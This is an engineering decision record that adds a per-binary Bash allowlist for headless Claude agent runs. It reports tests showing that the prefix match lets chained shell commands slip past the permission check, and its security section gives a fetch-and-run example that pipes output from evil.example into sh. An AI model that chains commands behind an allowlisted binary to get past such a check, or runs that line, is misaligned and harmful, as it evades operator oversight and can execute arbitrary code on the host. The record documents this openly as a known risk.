# ADR 0063: Scoped Bash allowlist for mutating Claude executor runs

- Status: Accepted
- Date: 2026-08-13
- Owners: Core, Security
- Tracked by issue #537

## Context

A real Claude implementation agent run recorded in #537 could not execute a
single shell command: `pnpm db:types`, `pnpm typecheck`, `supabase --version`,
and `docker exec ... psql` were all denied with "This command requires
approval." The task's only deliverable was never produced.

The cause: `claude-executor.ts` passes `--permission-mode acceptEdits` for
mutating runs, but `acceptEdits` only auto-approves the Edit/Write tool
family — never Bash. `--safe-mode` keeps the strict permission engine on, and
headless `-p` has no TTY to grant interactive approval, so every Bash call is
denied by default. No `--allowedTools` was ever passed. `docs/SECURITY.md`
already flagged this ("Comandos shell adicionais podem depender das políticas
locais da CLI") — an acknowledged gap, not a designed policy.

The Codex executor has no equivalent wall: it runs `--sandbox
workspace-write` with approvals disabled in non-interactive mode. There is no
execution sandbox behind either executor — `LocalExecutionPlane` spawns the
CLI directly on the host workspace (ADR-0025 "Scope boundary";
`DockerSandboxRunner` is preview-only).

## Decision

Pre-approve a **scoped** Bash allowlist for `mutatesWorkspace: true` runs
only. `ClaudeCliExecutor` appends a single `--allowedTools=` token covering
the toolchain this repo's generated apps actually need (the commands denied
in #537): `pnpm`, `npm`, `npx`, `node`, `git`, `docker`, `supabase`, `psql`,
each as a `Bash(<bin> *)` pattern. Read-only (`plan`) runs get no allowlist —
there is nothing to pre-approve. The permission engine stays on; commands
outside the list stay denied.

**The flag must be a single argv token.** `--allowedTools` is documented as
taking a variadic list (`<tools...>`), and empirically a separate
space/comma-joined argv entry (`--allowedTools`, `'Bash(pnpm *) ...'`) is
greedily consumed together with the positional prompt that follows it,
breaking the CLI with `Error: Input must be provided either through stdin or
as a prompt argument when using --print`. `--allowedTools=Bash(pnpm
*),Bash(npm *),...` (equals-sign form, one token) does not have this problem.
Verified against the real `claude` CLI (2.1.231):

- **Allowlisted command runs**: `pnpm -v` executed via Bash and returned
  `10.30.1`; `permission_denials: []` in the result event.
- **Non-allowlisted command is still denied**: `curl --version` produced a
  `tool_result` of `"This command requires approval"` (`is_error: true`), and
  the result event's `permission_denials` listed the `curl --version` call.

Both runs used the exact argv `ClaudeCliExecutor.invocation()` now builds for
a mutating request.

**The allowlist is a per-binary prefix filter, not a shell-aware boundary —
verified, not assumed.** `Bash(git *)` matches on the command string's
prefix. A compound command that *starts* with an allowlisted binary still
matches even if it chains further shell syntax after it. Run against the
same production argv: the prompt "run `git status && echo chained-ok`"
produced a single Bash tool call with `"command":"git status && echo
chained-ok"`, a `tool_result` containing `chained-ok` (i.e. the chained
`echo` executed), and `permission_denials: []` in the result event — the
compound command was never flagged. So an allowlisted prefix (`git`, `pnpm`,
`docker`, ...) can smuggle arbitrary shell chaining (`;`, `&&`, `|`, `$()`)
straight past the allowlist. This is not a bug in this change's
implementation — it's how the CLI's `Bash(<bin> *)` pattern works — but it
means the allowlist limits which *entrypoint binaries* an agent can invoke,
not what those invocations are allowed to do once shell-chained. See
Consequences.

## Alternatives considered

- **Leave Bash denied for Claude runs.** Rejected — this is the bug #537
  reports; a mutating implementation task that can never run its own
  toolchain (typecheck, codegen, migrations) cannot complete its work.
- **`--allow-dangerously-skip-permissions` / bare `Bash` wildcard.** Rejected
  by the repo owner's explicit call: the executor runs unsandboxed on the
  host (no `DockerSandboxRunner` in the loop yet), so a fully open Bash tool
  would let a misbehaving or compromised agent run arbitrary commands against
  the operator's machine. A scoped allowlist keeps the blast radius to the
  toolchain this repo's own generated apps are known to need.
- **Space- or comma-separated `--allowedTools` as a normal (non-`=`)
  flag/value pair.** This is the syntax the CLI's own `--help` text shows in
  its example, but it is variadic and swallows the positional prompt argument
  that follows it on this executor's argv shape (see Decision). Rejected once
  the real-CLI run reproduced the failure; the `=`-joined single-token form
  was verified to work instead.

## Consequences

- Positive: mutating Claude runs can execute the toolchain commands #537
  needed (`pnpm`, `npm`, `npx`, `node`, `git`, `docker`, `supabase`, `psql`)
  without interactive approval, while every other Bash invocation (e.g.
  `curl`, `rm -rf`, arbitrary binaries) still requires it and is denied
  headless.
- Negative / operational: the allowlist is a fixed, hand-picked set. A
  generated app that legitimately needs a shell tool outside this list (e.g.
  `python`, `curl` for a smoke test) will still hit "requires approval" and
  fail its task — this is a known, deliberate ceiling, not a bug. Extending
  the list is a one-line change to `MUTATING_BASH_ALLOWLIST` in
  `claude-executor.ts`.
- Security: **the allowlist is a per-binary prefix filter that limits which
  entrypoints an agent can invoke — it is not a command-injection boundary.**
  `Bash(<bin> *)` is a string-prefix match, not shell-aware: a command like
  `git status && echo chained-ok` (or, in principle, `git status; curl
  evil.example | sh`) still starts with `git ` and matches `Bash(git *)`, so
  it runs with no further check on what follows the allowlisted prefix
  (confirmed empirically above). Because the executor runs the CLI
  unsandboxed on the host (ADR-0025) with no outer sandbox catching what
  slips through, this residual risk is real and explicitly accepted, not
  overlooked: any agent that can invoke an allowlisted binary can chain
  arbitrary shell commands after it. The allowlist's actual value is
  narrower than "containment" — it stops an agent from reaching for a
  *disallowed* binary outright (no `curl`, no arbitrary interpreter as the
  literal first word), and it keeps a paper trail of which entrypoint was
  used. It does not stop an allowlisted entrypoint from being used as a
  chaining vector. Closing that gap needs either shell-free invocation
  (argv-array Bash calls with no shell chaining operators available) or a
  real execution sandbox; neither exists yet, and both are future work, not
  in scope here.

## Validation and rollback

Validated by `packages/executors/src/cli-executors.test.ts` (exact-argv
assertions for both the mutating case, with the allowlist token, and the
non-mutating case, with none) and by the real-CLI transcripts above. To roll
back, remove the `if (request.mutatesWorkspace) args.push(...)` call in
`ClaudeCliExecutor.invocation()`; Claude mutating runs return to their
pre-#537 all-Bash-denied state.
